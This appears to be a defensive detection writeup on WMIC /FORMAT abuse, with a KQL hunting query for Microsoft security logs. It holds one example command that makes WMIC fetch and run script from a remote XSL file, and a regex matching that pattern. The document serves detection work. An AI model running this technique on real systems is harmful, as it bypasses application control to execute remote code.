# WMIC Unusual module loads
This analytic will look for Potential WMIC Abuse. Windows Management Instrumentation Command retrieves a huge range of information about local or remote computers. It makes configuration changes to multiple remote machines. The WMIC is a deprecated tool as of 2021. While it is unlikely to stop working for a few years, no new features will be added and it may eventually be removed. WMIC is a Feature on Demand (FoD) that's preinstalled by default in Windows 11. 

For decoding a command see: https://gchq.github.io/CyberChef/
For better understanding of the WMIC command see: https://ss64.com/nt/wmic.html

### Things of Note: 
    - /NODE: which is used to connect to remote devices. this can show up in any of the scenarios. 
    - /FORMAT: Executes JScript or VBScript embedded in the target remote XSL stylesheet.

### WMIC loading unusual modules:
This is specifically looking for WMIC to reach out to the internet to download something using the "/FORMAT" parameter. This parameter is meant to format data in to specific formats. However threat actors realized that is can be used to download malicious content from the internet and by pass some detections.  

XSL Script Processing, which can be used to bypass application control and—courtesy of WMIC’s /format option—download code from a remote location. it will download and execute the contents of the XSL file. Executes JScript or VBScript embedded in the target remote XSL stylesheet.

wmic.exe process get brief /format:"\\8.8.8.8\c$\Tools\pocremote.xsl"

This WMIC Process is performing network call to 8.8.8.8 to download an xsl file and then running JScript or VBScript embedded in the file. Note: Payload written on disk: IE local cache

### Look For: 
1. can ignore internal IP addresses and loopback IP (127.0.0.1)
2. if possible check the downloaded file on OSINT tools 
    - if we can submit the link or the file hash to OSINT tools that should give use an idea of how malicious/suspicious

# KQL:
```kql
//Unusual module loads
// looks for http, https, ftp, or ip address connection to install a file
let SusModule = @'(?i)(.*)wmic(.*)(\/format:)(.*)(((http|https|ftp):\/\/)|((\d{1,3}\.){3}\d{1,3}))(.+)'
;
let SEvent = SecurityEvent
| where CommandLine matches regex SusModule 
;
let DEvent = DeviceEvents
| where InitiatingProcessCommandLine matches regex SusModule or ProcessCommandLine matches regex SusModule
;
let DPEvent = DeviceProcessEvents
| where InitiatingProcessCommandLine matches regex SusModule or ProcessCommandLine matches regex SusModule
;
let DFEvent = DeviceFileEvents
| where InitiatingProcessCommandLine matches regex SusModule
;
let DREvent = DeviceRegistryEvents
| where InitiatingProcessCommandLine matches regex SusModule 
;
let SLog = Syslog
| where SyslogMessage matches regex SusModule 
; 
SEvent
| join kind=fullouter (SLog) on TimeGenerated
| join kind=fullouter (DPEvent) on TimeGenerated
| join kind=fullouter (DFEvent) on TimeGenerated
| join kind=fullouter (DREvent) on TimeGenerated
| join kind=fullouter (DEvent) on TimeGenerated
| extend InitiatingProcessCommandLine = coalesce(InitiatingProcessCommandLine, InitiatingProcessCommandLine1, InitiatingProcessCommandLine2, InitiatingProcessCommandLine3)
| extend ProcessCommandLine = coalesce(ProcessCommandLine, ProcessCommandLine1, SyslogMessage)
| extend TimeGenerated = coalesce(TimeGenerated, TimeGenerated1, TimeGenerated2, TimeGenerated3, TimeGenerated4, TimeGenerated5)
| extend DeviceName = coalesce(DeviceName, DeviceName1, DeviceName2, DeviceName3, Computer, Computer1)
| extend AccountName = coalesce(AccountName, AccountName1, AccountName2)
| extend InitiatingProcessAccountName = coalesce(InitiatingProcessAccountName, InitiatingProcessAccountName1, InitiatingProcessAccountName2, InitiatingProcessAccountName3)
| extend InitiatingProcessAccountUpn = coalesce(InitiatingProcessAccountUpn, InitiatingProcessAccountUpn1, InitiatingProcessAccountUpn2, InitiatingProcessAccountUpn3)
```
